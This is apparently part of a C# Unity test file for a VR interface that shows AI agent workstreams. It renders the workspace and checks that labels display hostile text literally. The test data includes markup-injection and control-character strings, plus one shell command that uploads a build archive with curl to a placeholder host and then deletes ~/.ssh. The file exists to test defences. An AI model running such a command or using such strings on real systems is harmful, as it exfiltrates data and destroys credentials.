            var spread = besideWindow ? 1f : CharacterStage.Spread(radius, surfaceDrop.HasValue ? -surfaceDrop.Value : CharacterStage.DefaultHeightFromEyes);
            var slots = besideWindow ? CharacterStage.WindowSlotDegrees : new[] { -30f, -18f, -6f, 6f, 18f, 30f };
            var origin = eyes + Vector3.down * (surfaceDrop ?? 0f);
            for (var slot = 0; slot < slots.Length; slot++)
            {
                var id = "render-" + slot.ToString(CultureInfo.InvariantCulture);
                var view = CharacterView.Create(parent, id);
                view.Show(show(id, slot));
                view.BadgeOnly = besideWindow;
                var standing = besideWindow ? radius * Mathf.Tan(CharacterStage.WindowSlotLiftDegrees[slot] * Mathf.Deg2Rad) : CharacterStage.DefaultHeightFromEyes;
                var (height, scale) = CharacterStage.Stance(view, radius, surfaceDrop ?? 0f, surfaceDrop.HasValue ? (float?)null : standing);
                var level = Quaternion.Euler(0f, slots[slot] * spread + turn, 0f) * Vector3.forward;
                view.transform.SetPositionAndRotation(origin + level * radius + Vector3.up * height, Quaternion.LookRotation(-level, Vector3.up));
                view.transform.localScale = Vector3.one * scale;
                characters.Add((view, CharacterTarget.Attach(view, id)));
            }
            return characters;
        }

        /// <summary>The person's eyes, looking 18 degrees down, with about a Quest 3's view.</summary>
        internal static Camera MakeCamera(Transform parent, Vector3 eyes, RenderTexture texture)
        {
            var go = new GameObject("Eyes") { tag = "MainCamera" };
            go.transform.SetParent(parent, false);
            go.transform.SetPositionAndRotation(eyes, Quaternion.Euler(18f, 0f, 0f));
            var camera = go.AddComponent<Camera>();
            camera.clearFlags = CameraClearFlags.SolidColor;
            camera.backgroundColor = Color.black;
            camera.fieldOfView = 90f;
            camera.nearClipPlane = 0.05f;
            camera.farClipPlane = 20f;
            camera.stereoTargetEye = StereoTargetEyeMask.None;
            camera.targetTexture = texture;
            return camera;
        }

        internal static Texture2D Render(Camera camera, RenderTexture texture)
        {
            camera.Render();
            var previous = RenderTexture.active;
            RenderTexture.active = texture;
            var image = new Texture2D(Size, Size, TextureFormat.RGBA32, false);
            image.ReadPixels(new Rect(0, 0, Size, Size), 0, 0);
            image.Apply();
            RenderTexture.active = previous;
            return image;
        }

        /// <summary>
        /// A panel <paramref name="size"/> big in its own units on the render, inset from its rounded
        /// edge: the rectangle inside its outline, which is a trapezoid, since the panel leans back to
        /// face the eyes.
        /// </summary>
        internal static RectInt ScreenRect(Camera camera, Transform panel, Vector2 size)
        {
            Vector3 Corner(float x, float y) => camera.WorldToScreenPoint(panel.TransformPoint(new Vector3(x * size.x / 2f, y * size.y / 2f, 0f)));
            var bottomLeft = Corner(-1f, -1f);
            var bottomRight = Corner(1f, -1f);
            var topRight = Corner(1f, 1f);
            var topLeft = Corner(-1f, 1f);
            var left = Mathf.Clamp(Mathf.CeilToInt(Mathf.Max(bottomLeft.x, topLeft.x)) + Inset, 0, Size);
            var right = Mathf.Clamp(Mathf.FloorToInt(Mathf.Min(bottomRight.x, topRight.x)) - Inset, 0, Size);
            var bottom = Mathf.Clamp(Mathf.CeilToInt(Mathf.Max(bottomLeft.y, bottomRight.y)) + Inset, 0, Size);
            var top = Mathf.Clamp(Mathf.FloorToInt(Mathf.Min(topLeft.y, topRight.y)) - Inset, 0, Size);
            return new RectInt(left, bottom, Mathf.Max(0, right - left), Mathf.Max(0, top - bottom));
        }

        /// <summary>How many pixels inside a rectangle differ between two renders, and the largest difference in any channel.</summary>
        internal static (int Changed, float Largest) Compare(Texture2D a, Texture2D b, RectInt rect)
        {
            var changed = 0;
            var largest = 0f;
            for (var y = rect.yMin; y < rect.yMax; y++)
            {
                for (var x = rect.xMin; x < rect.xMax; x++)
                {
                    var p = a.GetPixel(x, y);
                    var q = b.GetPixel(x, y);
                    var difference = Mathf.Max(Mathf.Abs(p.r - q.r), Mathf.Max(Mathf.Abs(p.g - q.g), Mathf.Abs(p.b - q.b)));
                    largest = Mathf.Max(largest, difference);
                    if (difference > Tolerance) changed++;
                }
            }
            return (changed, largest);
        }

        /// <summary>
        /// A character's whole label on the render, its badge and mark included, from each part's own
        /// corners: tighter than their bounds in the world, which grow as the character turns.
        /// </summary>
        internal static Rect LabelRect(Camera camera, CharacterView view)
        {
            float minX = float.MaxValue, minY = float.MaxValue, maxX = float.MinValue, maxY = float.MinValue;
            foreach (var part in view.Label.GetComponentsInChildren<MeshFilter>(false))
            {
                if (part.sharedMesh == null) continue;
                var bounds = part.sharedMesh.bounds;
                if (bounds.size == Vector3.zero) continue;
                for (var corner = 0; corner < 8; corner++)
                {
                    var local = bounds.center + Vector3.Scale(bounds.extents, new Vector3((corner & 1) == 0 ? -1f : 1f, (corner & 2) == 0 ? -1f : 1f, (corner & 4) == 0 ? -1f : 1f));
                    var screen = camera.WorldToScreenPoint(part.transform.TransformPoint(local));
                    minX = Mathf.Min(minX, screen.x);
                    maxX = Mathf.Max(maxX, screen.x);
                    minY = Mathf.Min(minY, screen.y);
                    maxY = Mathf.Max(maxY, screen.y);
                }
            }
            return Rect.MinMaxRect(minX, minY, maxX, maxY);
        }

        /// <summary>A body as seen from the eyes: its shell's own extent around where it is now, across the line of sight.</summary>
        internal static GlazeChecks.Extent BodyExtent(CharacterView view, Vector3 eyes)
        {
            var shell = view.Body.Find("Shell");
            var extents = shell.GetComponent<MeshFilter>().sharedMesh.bounds.extents;
            var scale = shell.lossyScale;
            return GlazeChecks.Facing(view.WorkstreamId + "'s body", eyes, shell.position, Mathf.Max(extents.x * scale.x, extents.z * scale.z), extents.y * scale.y);
        }

        /// <summary>Whether any part of a character's body falls inside the workspace's outline on the render.</summary>
        internal static bool Covered(Camera camera, CharacterTarget target, RectInt rect)
        {
            var center = camera.WorldToScreenPoint(target.BodyPosition);
            var edge = camera.WorldToScreenPoint(target.BodyPosition + camera.transform.up * (CharacterView.BodyExtent * target.Scale));
            var radius = Vector2.Distance(center, edge);
            var nearestX = Mathf.Clamp(center.x, rect.xMin - Inset, rect.xMax + Inset);
            var nearestY = Mathf.Clamp(center.y, rect.yMin - Inset, rect.yMax + Inset);
            return center.z > 0f && Vector2.Distance(new Vector2(center.x, center.y), new Vector2(nearestX, nearestY)) < radius;
        }

        /// <summary>
        /// The workspace as a Quest 3 shows it, to judge legibility: the eyes turned to its center, at
        /// about the headset's 25 pixels per degree near the middle of its lenses.
        /// </summary>
        internal static Texture2D CloseUp(Camera camera, RenderTexture texture, Transform panel)
        {
            var rotation = camera.transform.rotation;
            var fieldOfView = camera.fieldOfView;
            camera.transform.rotation = Quaternion.LookRotation(panel.position - camera.transform.position, Vector3.up);
            camera.fieldOfView = Size / QuestPixelsPerDegree;
            var image = Render(camera, texture);
            camera.transform.rotation = rotation;
            camera.fieldOfView = fieldOfView;
            return image;
        }

        /// <summary>
        /// The directed work's answers as the bundled demonstration shows them: at its approval, and
        /// once the approved turn has ended with a failing test.
        /// </summary>
        private static IEnumerable<(string Suffix, WorkspaceQuestion Question, UnderstandPrompt Prompt, Func<AnswerRoom, SectionPresentation> Answer)> DemonstrationSections()
        {
            var asset = Resources.Load<TextAsset>("HalcyonicDemonstration");
            if (asset == null) throw new InvalidOperationException("The demonstration is missing from Resources.");
            var recording = DemonstrationRecording.Parse(asset.text);
            // The beginning holds at the agent's question; its first option runs on to the approval.
            var beginning = recording.Nodes[0];
            var answered = beginning.BranchesAfter(beginning.Events.Count).First(branch => branch.Answer.Kind == DemonstrationAnswerKind.Answer).Node;
            var atApproval = recording.Nodes[answered];
            var approve = atApproval.BranchesAfter(atApproval.Events.Count).First(branch => branch.Answer.Kind == DemonstrationAnswerKind.Approve);
            var executionId = approve.Answer.ExecutionId;
            var now = DateTimeOffset.UtcNow;
            var points = new[]
            {
                ("", answered, atApproval.Events.Count),
                ("-after-approving", approve.Node, recording.Nodes[approve.Node].Events.Count),
            };
            foreach (var (suffix, node, played) in points)
            {
                var understanding = recording.UnderstandingAt(executionId, node, played)
                    ?? throw new InvalidOperationException("The demonstration holds no understanding there.");
                var evaluation = recording.EvaluationAt(executionId, node, played)
                    ?? throw new InvalidOperationException("The demonstration holds no evaluation there.");
                var understood = new IntelligenceRead<UnderstandingResponse>(understanding.Response, understanding.ReadAt, recorded: true);
                foreach (var (name, prompt) in new[]
                {
                    ("what-changed", UnderstandPrompt.WhatChanged),
                    ("why-changed", UnderstandPrompt.WhyChanged),
                    ("how-built", UnderstandPrompt.HowBuilt),
                })
                {
                    yield return (name + suffix, WorkspaceQuestion.Understand, prompt,
                        room => UnderstandingPresenter.Present(prompt, executionId, understood, false, null, now, TimeZoneInfo.Local, room));
                }
                var measured = new IntelligenceRead<EvaluationResponse>(evaluation.Response, evaluation.ReadAt, recorded: true);
                yield return ("checked" + suffix, WorkspaceQuestion.Checked, UnderstandPrompt.WhatChanged,
                    room => CheckedPresenter.Present(executionId, understood, false, null, measured, false, null, now, TimeZoneInfo.Local, room));
            }
        }

        /// <summary>
        /// The section with each character the committed static atlas lacks, such as the minus sign in
        /// "(+71 −0)", swapped for one it has, for the render only. A headset draws such a character from
        /// the dynamic fallback font asset at runtime; in the editor that would write the glyph into the
        /// committed fallback asset, which this check must never change.
        /// </summary>
        internal static SectionPresentation InStaticAtlas(SectionPresentation section, TMP_FontAsset font, SortedSet<char> swapped) =>
            new SectionPresentation(section.Kind, Swap(section.Provenance, font, swapped), section.ProvenanceTone,
                section.Lines.Select(line => InStaticAtlas(line, font, swapped)).ToList(), section.Simulated, section.Steps);

        private static SectionLine InStaticAtlas(SectionLine line, TMP_FontAsset font, SortedSet<char> swapped) =>
            line.With(Swap(line.Tag, font, swapped), Swap(line.Text, font, swapped), Swap(line.Words, font, swapped),
                line.Chip == null ? null : Swap(line.Chip, font, swapped));

        private static string Swap(string text, TMP_FontAsset font, SortedSet<char> swapped)
        {
            var characters = text.ToCharArray();
            for (var index = 0; index < characters.Length; index++)
            {
                var character = characters[index];
                if (char.IsWhiteSpace(character) || font.HasCharacter(character)) continue;
                swapped.Add(character);
                characters[index] = character == '−' ? '-' : '?';
            }
            return new string(characters);
        }

        /// <summary>The mock runtime's scripted question (fixtures/scenarios/question_asked.json).</summary>
        private static QuestionView Scripted() => new QuestionView
        {
            QuestionId = "question-1",
            Answerable = true,
            AskedAt = Time,
            Prompts = new List<QuestionPrompt>
            {
                new QuestionPrompt
                {
                    Key = "q0", Header = "Colour scheme", Text = "Which colour scheme should the dashboard use?",
                    Options = new List<QuestionOption>
                    {
                        new QuestionOption { Label = "Light", Description = "Dark text on a light background" },
                        new QuestionOption { Label = "Dark", Description = "Light text on a dark background" },
                    },
                    Multiple = false, FreeText = true, Secret = false,
                },
                new QuestionPrompt
                {
                    Key = "q1", Header = "Pages", Text = "Which pages should change?",
                    Options = new List<QuestionOption>
                    {
                        new QuestionOption { Label = "Sign in" },
                        new QuestionOption { Label = "Orders" },
                        new QuestionOption { Label = "Settings" },
                    },
                    Multiple = true, FreeText = false, Secret = false,
                },
            },
        };

        /// <summary>
        /// Every TextMeshPro label that shows now shows its text literally, and every icon, which is
        /// no text, stands on its own: one glyph of the icon set, at least
        /// <see cref="GlazeIcons.MinimumDegrees"/> as seen from <paramref name="eyes"/>, beside words.
        /// </summary>
        internal static IEnumerable<string> AllShowLiterally(GameObject root, string what, Vector3 eyes)
        {
            ForceMeshes(root);
            var failures = new List<string>();
            var count = 0;
            var icons = 0;
            foreach (var label in root.GetComponentsInChildren<TMP_Text>(false))
            {
                if (string.IsNullOrEmpty(label.text)) continue;
                if (GlazeIcons.IsIcon(label))
                {
                    icons++;
                    failures.AddRange(GlazeChecks.IconBesideWord(label, eyes, what));
                    continue;
                }
                count++;
                failures.AddRange(ShowsLiterally(label, what));
            }
            Debug.Log("Halcyonic: workspace render " + what + ": checked " + count + " labels and " + icons + " icons, " + failures.Count + " failing.");
            return failures;
        }

        /// <summary>
        /// A label shows its text literally: it interprets no markup, its text went in through the one
        /// rule exactly once, and the characters it laid out are that text, all of them, or, cut short,
        /// the first of them and an ellipsis. It never uses italics or bold, for which this font has no
        /// ellipsis, so TextMeshPro would cut text short without one for good.
        /// </summary>
        internal static IEnumerable<string> ShowsLiterally(TMP_Text label, string what)
        {
            var failures = new List<string>();
            var name = what + ": " + PathOf(label.transform);
            if (label.richText) failures.Add(name + " interprets markup.");
            if (!label.parseCtrlCharacters) failures.Add(name + " parses no escapes, so its doubled backslashes show double and other backslash sequences still change.");
            if ((label.fontStyle & (FontStyles.Italic | FontStyles.Bold)) != 0) failures.Add(name + " is set in italics or bold.");
            if (label.overflowMode != TextOverflowModes.Ellipsis && label.overflowMode != TextOverflowModes.Page)
            {
                failures.Add(name + " cuts text short without an ellipsis (" + label.overflowMode + ").");
            }
            foreach (var line in label.text.Split('\n'))
            {
                if (LabelText.ForTextMeshPro(Unescaped(line)) == line) continue;
                failures.Add(name + " shows text that did not go through the rule exactly once: " + Codes(line));
                break;
            }
            label.ForceMeshUpdate();
            failures.AddRange(GlazeChecks.NotFromIcons(label, what));
            var expected = Unescaped(label.text);
            var laidOut = LaidOut(label);
            if (label.isTextTruncated)
            {
                var cut = LastVisibleIndex(label);
                if (cut < 0 || label.textInfo.characterInfo[cut].character != Ellipsis) failures.Add(name + " is cut short without an ellipsis: " + Codes(laidOut));
                else if (!expected.StartsWith(laidOut.Substring(0, cut), StringComparison.Ordinal)) failures.Add(name + " shows " + Codes(laidOut) + " for " + Codes(expected));
            }
            else if (laidOut != expected)
            {
                failures.Add(name + " shows " + Codes(laidOut) + " for " + Codes(expected));
            }
            return failures;
        }

        /// <summary>
        /// The labels named, among those that show now, show the hostile text, so the check reached
        /// them: at least the tag that starts it, which a narrow label cuts after.
        /// </summary>
        private static IEnumerable<string> Carry(GameObject root, string what, params string[] names)
        {
            var labels = root.GetComponentsInChildren<TMP_Text>(false);
            var failures = new List<string>();
            foreach (var name in names)
            {
                if (!labels.Any(label => label.name == name && LaidOut(label).IndexOf(Marker.Substring(0, 3), StringComparison.Ordinal) >= 0))
                {
                    failures.Add(what + ": no label " + name + " shows the hostile text, so the check did not reach it.");
                }
            }
            return failures;
        }

        /// <summary>
        /// A character's label shows hostile text as written: its title, on a TextMeshPro label of the
        /// interface (<see cref="GlazeText"/>), by the one rule, and its badge and mark in Halcyonic's
        /// own words, by the same rule.
        /// </summary>
        private static IEnumerable<string> CharacterShowsLiterally(GameObject root, string name, Camera camera)
        {
            var failures = new List<string>();
            var view = CharacterView.Create(root.transform, "render-hostile");
            view.transform.SetPositionAndRotation(camera.transform.position + Vector3.forward * 1.2f, Quaternion.identity);
            view.Show(new CharacterPresentation(view.WorkstreamId, Hostile("title"), CharacterActivity.Failed, "Couldn't finish", AttentionLevel.Notice,
                new[] { "Couldn't finish: " + Hostile("note") }, 0, true, false, false));
            ForceMeshes(view.gameObject);
            foreach (var label in view.GetComponentsInChildren<TMP_Text>(false))
            {
                if (string.IsNullOrEmpty(label.text)) continue;
                failures.AddRange(GlazeIcons.IsIcon(label)
                    ? GlazeChecks.IconBesideWord(label, camera.transform.position, name + " character")
                    : ShowsLiterally(label, name + " character"));
            }
            failures.AddRange(Carry(view.gameObject, name + " character", "Title"));
            UnityEngine.Object.DestroyImmediate(view.gameObject);
            return failures;
        }

        /// <summary>
        /// What a command, an agent, a tool or a server could write where <paramref name="field"/>
        /// shows: markup, backslash sequences, an end of text character that would end a label there, a
        /// carriage return and a line break, a bidirectional override, a zero width space, a tag
        /// character and half a surrogate pair. Once the rule has shown it, every character is in the
        /// font's static atlas, so the check writes no glyph into the committed fallback font.
        /// </summary>
        internal static string Hostile(string field) =>
            Marker + " " + field + " <alpha=#00>hidden</alpha><sprite=0><br>" + Char(0x0003) + "after the end " + Backslash + "u0041" + Backslash + "n"
            + Char(0x202E) + "desrever" + Char(0x200B) + Char(0xE0041) + Char(0xE769) + "\r\n" + (char)0xD800 + " tail";

        private static SectionPresentation HostileSection() => new SectionPresentation(SectionKind.Understanding, Hostile("provenance"), SectionTone.Secondary,
            new[]
            {
                new SectionLine(Hostile("tag"), Hostile("claim"), SectionTone.Claim),
                new SectionLine("", Hostile("detail"), SectionTone.Secondary, detail: true),
            }, simulated: true);

        /// <summary>A shell command as long as an approval's summary may be, whose dangerous part comes last.</summary>
        private static string LongCommand()
        {
            var builds = Enumerable.Range(1, 22)
                .Select(index => "pnpm --filter @shop/package-" + index.ToString("00", CultureInfo.InvariantCulture) + " run build -- --mode=production");
            var command = "cd /Users/dev/projects/checkout-service && git fetch --all --prune && git checkout -B release/2026-10 origin/main && "
                + string.Join(" && ", builds)
                + " && tar -czf /tmp/release.tgz dist && curl -fsS -X POST --data-binary @/tmp/release.tgz https://uploads.example.invalid/release && rm -rf ~/.ssh";
            if (command.Length > 2000) throw new InvalidOperationException("The render's command is longer than an approval's summary may be.");
            return command;
        }

        private static string LongQuote() => string.Join(" ", Enumerable.Repeat("The migration ran and the limit works per address.", 4));

        /// <summary>
        /// What a TextMeshPro label with escape parsing on shows for <paramref name="text"/>, as
        /// TMP_Text.PopulateTextProcessingArray reads it in com.unity.ugui 2.0.0: two backslashes as
        /// one, a backslash with n, r, t or v as that control character, and a backslash with u and
        /// four hex digits, or U and eight, as the character they name.
        /// </summary>
        private static string Unescaped(string text)
        {
            var result = new StringBuilder(text.Length);
            for (var index = 0; index < text.Length; index++)
            {
                var character = text[index];
                if (character == '\\' && index < text.Length - 1)
                {
                    var next = text[index + 1];
                    var control = next switch
                    {
                        '\\' => '\\',
                        'n' => '\n',
                        'r' => '\r',
                        't' => '\t',
                        'v' => '\v',
                        _ => '\0',
                    };
                    if (control != '\0')
                    {
                        result.Append(control);
                        index++;
                        continue;
                    }
                    if (next == 'u' && text.Length > index + 5 && IsHex(text, index + 2, 4))
                    {
                        result.Append((char)int.Parse(text.Substring(index + 2, 4), NumberStyles.HexNumber, CultureInfo.InvariantCulture));
                        index += 5;
                        continue;
                    }
                    if (next == 'U' && text.Length > index + 9 && IsHex(text, index + 2, 8))
                    {
                        result.Append(char.ConvertFromUtf32(int.Parse(text.Substring(index + 2, 8), NumberStyles.HexNumber, CultureInfo.InvariantCulture)));
                        index += 9;
                        continue;
                    }
                }
                result.Append(character);
            }
            return result.ToString();
        }

        private static bool IsHex(string text, int start, int length)
        {
            for (var index = start; index < start + length; index++)
            {
                if (!Uri.IsHexDigit(text[index])) return false;
            }
            return true;
        }

        /// <summary>The characters a label laid out, shown or not, in order.</summary>
        private static string LaidOut(TMP_Text label)
        {
            var info = label.textInfo;
            var text = new StringBuilder(info.characterCount);
            for (var index = 0; index < info.characterCount; index++) text.Append(info.characterInfo[index].character);
            return text.ToString();
        }

        private static int LastVisibleIndex(TMP_Text label)
        {
            var last = -1;
            for (var index = 0; index < label.textInfo.characterCount; index++)
            {
                if (label.textInfo.characterInfo[index].isVisible) last = index;
            }
            return last;
        }

        internal static void ForceMeshes(GameObject root)
        {
            foreach (var text in root.GetComponentsInChildren<TMP_Text>(true)) text.ForceMeshUpdate();
        }

        /// <summary>A label's place among its parents, for a failure's message.</summary>
        private static string PathOf(Transform transform)
        {
            var path = transform.name;
            for (var parent = transform.parent; parent != null && parent.parent != null; parent = parent.parent) path = parent.name + "/" + path;
            return path;
        }

        /// <summary>Text for a failure's message, with every character that is not printable ASCII as its code.</summary>
        private static string Codes(string text)
        {
            var result = new StringBuilder();
            foreach (var character in text.Take(100))
            {
                result.Append(character >= 0x20 && character < 0x7F ? character.ToString() : "[U+" + ((int)character).ToString("X4", CultureInfo.InvariantCulture) + "]");
            }
            return result.ToString();
        }

        private static string Char(int codePoint) => char.ConvertFromUtf32(codePoint);

        private static char LastVisible(TMP_Text label)
        {
            var last = '\0';
            for (var index = 0; index < label.textInfo.characterCount; index++)
            {
                var character = label.textInfo.characterInfo[index];
                if (character.isVisible) last = character.character;
            }
            return last;
        }

        internal static string Degrees(float value) => value.ToString("0.0", CultureInfo.InvariantCulture);

        /// <summary>
        /// Drawing TextMeshPro text in the editor upgrades the committed font asset to the current
        /// format in memory and marks it changed, and the editor would save it on the way out: a
        /// change to Unity's resources that this check must not make.
        /// </summary>
        internal static void KeepFontAssetsAsCommitted()
        {
            foreach (var font in Resources.FindObjectsOfTypeAll<TMP_FontAsset>())
            {
                if (!AssetDatabase.Contains(font)) continue;
                EditorUtility.ClearDirty(font);
                if (font.material != null) EditorUtility.ClearDirty(font.material);
                if (font.atlasTextures == null) continue;
                foreach (var atlas in font.atlasTextures)
                {
                    if (atlas != null) EditorUtility.ClearDirty(atlas);
                }
            }
        }

        /// <summary>Characters with the demonstration's kind of titles, the middle one needing the person.</summary>
        internal static CharacterPresentation Presentation(string id, int slot)
        {
            var titles = new[]
            {
                "Paginate the order history endpoint",
                "Send an order confirmation email",
                "Refresh the checkout copy",
                "Add rate limiting to the sign-in endpoint",
                "Upgrade the image pipeline",
                "Tidy the release notes",
            };
            return slot switch
            {
                3 => new CharacterPresentation(id, titles[slot], CharacterActivity.WaitingForHuman, "Waiting for you", AttentionLevel.ActionRequired,
                    new[] { "It wants to run: Run make migrate" }, 1, true, false, false),
                1 or 4 => new CharacterPresentation(id, titles[slot], CharacterActivity.TurnFinished, "Finished this round", AttentionLevel.None,
                    Array.Empty<string>(), 0, true, false, false),
                _ => new CharacterPresentation(id, titles[slot], CharacterActivity.Working, "Working", AttentionLevel.None,
                    Array.Empty<string>(), 0, true, false, false),
            };
        }
    }
}
